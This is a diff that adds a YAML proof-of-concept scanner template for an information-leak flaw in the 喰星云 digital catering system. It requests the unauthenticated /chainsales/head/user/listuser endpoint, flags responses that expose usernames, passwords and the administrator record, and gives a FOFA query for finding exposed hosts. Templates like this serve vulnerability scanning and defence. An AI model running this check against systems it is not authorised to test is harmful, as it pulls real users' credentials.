@@ -1,0 +1,16 @@
+id: poc-yaml-can-xing-yun-listuser-info-leak
+info:
+  name: 喰星云-数字化餐饮服务系统 listuser 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 喰星云-数字化餐饮服务系统
+  fofa: body="tmp_md5_pwd"
+requests:
+- method: GET
+  path: /chainsales/head/user/listuser
+  expression: "status_code == 200 && \ncontains(body,\"\\\"username\\\":\") &&\ncontains(body,\"\
+    \\\"pwd\\\":\") &&\ncontains(body,\"\\\"rname\\\":\\\"系统管理员\\\"\") &&\n!contains(body,\"\
+    <\")\n"
+variables: {}
+transport: http
